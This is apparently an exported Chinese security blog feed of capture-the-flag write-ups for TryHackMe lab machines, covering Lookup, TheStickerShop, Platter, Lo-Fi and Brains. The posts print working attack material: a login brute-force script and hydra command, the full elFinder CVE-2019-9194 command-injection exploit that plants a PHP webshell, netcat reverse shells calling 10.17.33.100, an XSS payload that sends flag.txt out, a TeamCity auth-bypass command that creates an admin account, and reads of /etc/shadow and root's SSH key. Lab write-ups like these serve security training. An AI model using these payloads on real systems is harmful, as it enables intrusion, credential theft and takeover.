flag{md5}</p><p>免杀马：</p><p>是指经过特殊处理和混淆（如加密），使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序</p><p>查看apache日志：&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/1743756381211-3cbdb187-35d9-4f18-934e-ac8e976c8d02.png" alt="img"></p><p>查看文件，可以看到经过了base64和异或操作，常见的免杀操作</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/1743756550699-f7dacb21-ae66-409f-a687-53aaa4ded8c4.png" alt="img"></p><p>路径：&#x2F;var&#x2F;www&#x2F;html&#x2F;wap&#x2F;top.php</p><p>flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}</p>]]></content>
      
      
      
        <tags>
            
            <tag> 玄机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lookup</title>
      <link href="/2025/04/02/lookup/"/>
      <url>/2025/04/02/lookup/</url>
      
        <content type="html"><![CDATA[<p>首先需要改在hosts里面加一个：10.10.46.174   lookup.thm   以防止重定向。</p><p>仔细观察两个抓包页面：</p><span id="more"></span><p><img src="/../lookup/1.png" alt="1"></p><p><img src="/../lookup/2.png" alt="2"></p><p>一个返回Wrong username or password一个返回 Wrong password，所以断定存在一个admin账户。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">wordlist = <span class="string">&quot;/usr/share/seclists/Usernames/Names/names.txt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(wordlist, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        username = line.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;testpassword&quot;</span>&#125;</span><br><span class="line">        response = requests.post(url=<span class="string">&quot;http://lookup.thm/login.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Wrong password&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[*] Found a username! \&quot;<span class="subst">&#123;username&#125;</span>\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><p><img src="/../lookup/3.png" alt="3"></p><p>发现存在一个jose</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jose -P <span class="number">10</span>-million-password.txt lookup.thm http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong&quot; -V</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个爆破有点慢，可以直接用yakit来进行爆破，最后得到账号密码：最后成功进入后台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jose</span><br><span class="line">password123</span><br></pre></td></tr></table></figure><p><img src="/../lookup/4.png" alt="4"></p><p>然后根据<a href="https://www.exploit-db.com/exploits/46481">https://www.exploit-db.com/exploits/46481</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># Exploit Title: elFinder &lt;= 2.1.47 - Command Injection vulnerability in the PHP connector.</span></span><br><span class="line"><span class="string"># Date: 26/02/2019</span></span><br><span class="line"><span class="string"># Exploit Author: @q3rv0</span></span><br><span class="line"><span class="string"># Vulnerability reported by: Thomas Chauchefoin</span></span><br><span class="line"><span class="string"># Google Dork: intitle:&quot;elFinder 2.1.x&quot;</span></span><br><span class="line"><span class="string"># Vendor Homepage: https://studio-42.github.io/elFinder/</span></span><br><span class="line"><span class="string"># Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz</span></span><br><span class="line"><span class="string"># Version: &lt;= 2.1.47</span></span><br><span class="line"><span class="string"># Tested on: Linux 64bit + Python2.7</span></span><br><span class="line"><span class="string"># PoC: https://www.portal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/</span></span><br><span class="line"><span class="string"># CVE: CVE-2019-9194</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Usage: python exploit.py [URL]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保同级目录下存在一个jpg文件</span></span><br><span class="line">payload = <span class="string">&quot;test.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p &gt; hack.php;echo test.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">usage</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python exploit.py [URL]&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url, payload</span>):</span><br><span class="line">    files = &#123;<span class="string">&quot;upload[]&quot;</span>: (payload, <span class="built_in">open</span>(<span class="string">&quot;test.jpg&quot;</span>, <span class="string">&quot;rb&quot;</span>))&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;reqid&quot;</span>: <span class="string">&quot;1693222c439f4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;upload&quot;</span>,</span><br><span class="line">        <span class="string">&quot;target&quot;</span>: <span class="string">&quot;l1_Lw&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mtime[]&quot;</span>: <span class="string">&quot;1497726174&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(<span class="string">&quot;%s/php/connector.minimal.php&quot;</span> % url, files=files, data=data)</span><br><span class="line">    j = json.loads(r.text)</span><br><span class="line">    <span class="keyword">return</span> j[<span class="string">&quot;added&quot;</span>][<span class="number">0</span>][<span class="string">&quot;hash&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgRotate</span>(<span class="params">url, <span class="built_in">hash</span></span>):</span><br><span class="line">    r = requests.get(</span><br><span class="line">        <span class="string">&quot;%s/php/connector.minimal.php?target=%s&amp;width=539&amp;height=960&amp;degree=180&amp;quality=100&amp;bg=&amp;mode=rotate&amp;cmd=resize&amp;reqid=169323550af10c&quot;</span></span><br><span class="line">        % (url, <span class="built_in">hash</span>)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>(<span class="params">url</span>):</span><br><span class="line">    r = requests.get(<span class="string">&quot;%s/php/hack.php&quot;</span> % url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Pwned! :)&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Getting the shell...&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                inputs = <span class="built_in">input</span>(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">                r = requests.get(<span class="string">&quot;%s/php/hack.php?c=%s&quot;</span> % (url, inputs))</span><br><span class="line">                <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                sys.exit(<span class="string">&quot;\nBye kaker!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] The site seems not to be vulnerable :(&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    usage()</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Uploading the malicious image...&quot;</span>)</span><br><span class="line">    <span class="built_in">hash</span> = upload(url, payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Running the payload...&quot;</span>)</span><br><span class="line">    imgRotate(url, <span class="built_in">hash</span>)</span><br><span class="line">    shell(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>成功拿到shell：</p><p><img src="/../lookup/5.png" alt="5"></p><p>现在我们创建一个有效载荷来建立一个交互式 shell。为此，我们使用 revshell.com。我们选择<code>nc mkfifo</code>一个并对有效载荷进行 URL 编码，因为我们有一个 web shell</p><p><img src="/../lookup/6.png" alt="6"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.17.33.100%208888%20%3E%2Ftmp%2Ff</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../lookup/9.png" alt="9"></p><p>查找具有suid权限的二进制文：find &#x2F; -perm &#x2F;4000 2&gt;&#x2F;dev&#x2F;null | xargs ls -l</p><p>发现了一个可疑的文件：-rwsr-sr-x 1 root   root             17176 Jan 11  2024 &#x2F;usr&#x2F;sbin&#x2F;pwm</p><p>ssh进行远程连接，拿到第一个flag，然后sudo -l  查看当前用户在系统上可以使用sudo执行的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">think</span><br><span class="line">josemario.AKA(think)</span><br></pre></td></tr></table></figure><p><img src="/../lookup/10.png" alt="10"></p><p><img src="/../lookup/11.png" alt="11"></p><p>发现有个look直接去：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>   搜索，它有个读文件的用法：</p><p><img src="/../lookup/12.png" alt="12"></p><p>look ‘’ &#x2F;etc&#x2F;shadow</p><p><img src="/../lookup/13.png" alt="13"></p><p>发现成功，接下来读取root用户的ssh私钥：</p><p>sudo look ‘’ &#x2F;root&#x2F;.ssh&#x2F;id_rsa</p><p><img src="/../lookup/14.png" alt="14"></p><p>最后将得到的ssh连接的密钥保存到一个id_rsa文件中（记得是全部内容），然后赋予这个文件600权限</p><p>chmod 600 id_rsa最后成功连上去拿到root权限</p><p><img src="/../lookup/15.png" alt="15"></p>]]></content>
      
      
      
        <tags>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TheStickerShop</title>
      <link href="/2025/04/01/TheStickerShop/"/>
      <url>/2025/04/01/TheStickerShop/</url>
      
        <content type="html"><![CDATA[<p>nmap进行扫描：</p><span id="more"></span><p>发现开放了一个8080端口，其他端口都有防火墙。然后访问发现是一个页面，有个feedback，这里注意到短期时间内会有员工来看，就提供了xss攻击的条件。</p><p><img src="/../TheStickerShop/1.png" alt="1"></p><p>开启python服务：</p><p>sudo python3 -m http.server 80</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">fetch(&#x27;http://127.0.0.1:8080/flag.txt&#x27;)</span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line">    fetch(&#x27;http://10.17.33.100/?data=&#x27; + encodeURIComponent(data))</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/../TheStickerShop/2.png" alt="2"></p><p>然后执行js代码，让目标机器把flag.txt给带出来。</p><p><img src="/../TheStickerShop/3.png" alt="3"></p>]]></content>
      
      
      
        <tags>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Platter</title>
      <link href="/2025/04/01/Platter/"/>
      <url>/2025/04/01/Platter/</url>
      
        <content type="html"><![CDATA[<p>信息搜集，在contact里面找到了这个网站的框架： Silverpeas  ，还有一个用户的名字： scr1ptkiddy  </p><span id="more"></span><p><img src="/../Platter/1.png" alt="1"></p><p>访问：<a href="http://10.10.168.133:8080/silverpeas%EF%BC%8C%E5%87%BA%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E6%A1%86%E3%80%82">http://10.10.168.133:8080/silverpeas，出现一个登录框。</a></p><p><img src="/../Platter/4.png" alt="4"></p><p>拿着这个项目框架去cve上面搜，会发现一个：Silverpeas CRM - 身份验证绕过</p><p><a href="https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d">https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d</a></p><p>而通过信息搜集发现，这个框架的默认账号密码：SilverAdmin&#x2F;SilverAdmin</p><p>然后按照上面cve操作：最后成功进入后台</p><p><img src="/../Platter/2.png" alt="2"></p><p><img src="/../Platter/3.png" alt="3"></p><p>最后发现有三个用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manager</span><br><span class="line">scr1ptkiddy</span><br><span class="line">Administrateur </span><br></pre></td></tr></table></figure><p>按照上面提到的cve，一个一个的试。最后在Manger发现一个ssh的连接</p><p><img src="/../Platter/9.png" alt="9"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username: tim</span><br><span class="line"></span><br><span class="line">Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol</span><br></pre></td></tr></table></figure><p>然后通过ssh进行连接，拿到第一个flag，并且通过id查看tim的用户信息</p><p><img src="/../Platter/11.png" alt="11"></p><p>发现他是adm组的组员，adm组通常 用于让用户访问系统日志文件  ，例如&#x2F;var&#x2F;log 目录下的日志</p><p>这里还发现了一个用户：tyler</p><p><img src="/../Platter/6.png" alt="6"></p><p>在日志中查询包含 tyler 的文件内容：grep -iR tyler  </p><p><img src="/../Platter/5.png" alt="5"></p><p>发现passwd：_Zd_zx7N823&#x2F;</p><p>然后通过ssh连接上去，发现允许tyler执行任何命令，直接拿root权限，获取flag</p><p><img src="/../Platter/7.png" alt="7"></p><p><img src="/../Platter/8.png" alt="8"></p>]]></content>
      
      
      
        <tags>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lo-Fi</title>
      <link href="/2025/03/31/Lo-Fi/"/>
      <url>/2025/03/31/Lo-Fi/</url>
      
        <content type="html"><![CDATA[<p>一切都会好起来的，加油！</p><p>访问进去就是一个界面</p><span id="more"></span><p><img src="/../Lo-Fi/1-1743435272664-11.png" alt="1"></p><p>然后当点击右边的文件的时候，发现上面出现了一个page参数，并且后面的值就是我们刚刚点击的文件。</p><p><img src="/../Lo-Fi/2.png" alt="2"></p><p>里有参数有，文件，所以就直接测试文件包含。</p><p>?page&#x3D;&#x2F;etc&#x2F;passwd</p><p>最后通过目录穿越，把&#x2F;etc&#x2F;passwd给泄露出来了</p><p><img src="/../Lo-Fi/4.png" alt="4"></p><p>然后顺着这个思路去找flag。</p><p><img src="/../Lo-Fi/5.png" alt="5"></p>]]></content>
      
      
      
        <tags>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>brains</title>
      <link href="/2025/03/31/brains/"/>
      <url>/2025/03/31/brains/</url>
      
        <content type="html"><![CDATA[<p>还是太菜了，搞渗透和java吧，这个网站，这也是我的第一篇博客，希望以后也能够坚持下去，加油吧</p><span id="more"></span><p>dirsearch扫描不出来什么东西。</p><p>使用nmap进行端口扫描：nmap -A 10.10.205.41</p><p><img src="/pic/brains/1.png" alt="1"></p><p>扫描出来发现了一个5000端口。发现是一个登录界面。</p><p><img src="/pic/brains/2.png" alt="2"></p><p>这里的话，发现了它的一个版本信息：TeamCity 2023.11.3，上网搜索会发现它会有cve</p><p><img src="/pic/brains/3.png" alt="3"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">为了利用此漏洞成功调用经过身份验证的端点/app/rest/server，未经身份验证的攻击者必须在 HTTP(S) 请求期间满足以下三个要求：</span><br><span class="line"></span><br><span class="line">请求未经身份验证的资源，生成 404 响应。这可以通过请求不存在的资源来实现，例如：</span><br><span class="line"></span><br><span class="line">/hax</span><br><span class="line"></span><br><span class="line">传递一个名为 jsp 的 HTTP 查询参数，其中包含经过身份验证的 URI 路径的值。这可以通过附加 HTTP 查询字符串来实现，例如：</span><br><span class="line"></span><br><span class="line">?jsp=/app/rest/server</span><br><span class="line"></span><br><span class="line">确保任意 URI 路径以 .jsp 结尾。这可以通过附加 HTTP 路径参数段来实现，例如：</span><br><span class="line"></span><br><span class="line">;.jsp</span><br><span class="line"></span><br><span class="line">结合以上要求，攻击者的URI路径变为：</span><br><span class="line"></span><br><span class="line">复制</span><br><span class="line">/hax?jsp=/app/rest/server;.jsp</span><br><span class="line">通过利用身份验证绕过漏洞，我们可以成功调用无需身份验证的已经过身份验证的端点。</span><br><span class="line"></span><br><span class="line">复制</span><br><span class="line">C:\Users\sfewer&gt;curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/server;.jsp</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -ik &#x27;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">205</span>.<span class="number">41</span>:<span class="number">50000</span>/hax?jsp=/app/rest/server;.jsp&#x27;</span><br></pre></td></tr></table></figure><p><img src="/pic/brains/4.png" alt="4"></p><p>然后调整有效载荷并且添加我们的用户 jujube</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -ik http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">205</span>.<span class="number">41</span>:<span class="number">50000</span>/hax?jsp=/app/rest/users\;.jsp -X POST -H &quot;Content-<span class="built_in">Type</span>: application/json&quot; --data &quot;&#123;\&quot;username\&quot;: \&quot;jujube\&quot;, \&quot;password\&quot;: \&quot;jujube\&quot;, \&quot;email\&quot;: \&quot;<span class="number">0</span>xb0b\&quot;, \&quot;roles\&quot;: &#123;\&quot;role\&quot;: [&#123;\&quot;roleId\&quot;: \&quot;SYSTEM_ADMIN\&quot;, \&quot;scope\&quot;: \&quot;g\&quot;&#125;]&#125;&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="/pic/brains/5.png" alt="5"></p><p>然后进行登录。成功了。</p><p>接下来就执行找py打shell了。</p><p><img src="/pic/brains/7.png" alt="7"></p><p>然后反弹shell，以获取交互式shell</p><p>这里推荐一个网站：<a href="https://www.revshells.com/">https://www.revshells.com/</a></p><p><img src="/pic/brains/image.png" alt="image"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">busybox nc <span class="number">10</span>.<span class="number">17</span>.<span class="number">33</span>.<span class="number">100</span> <span class="number">8888</span> -e sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/pic/brains/8.png" alt="8"></p><p>sad</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>获取交互式shell，然后去用户目录拿flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
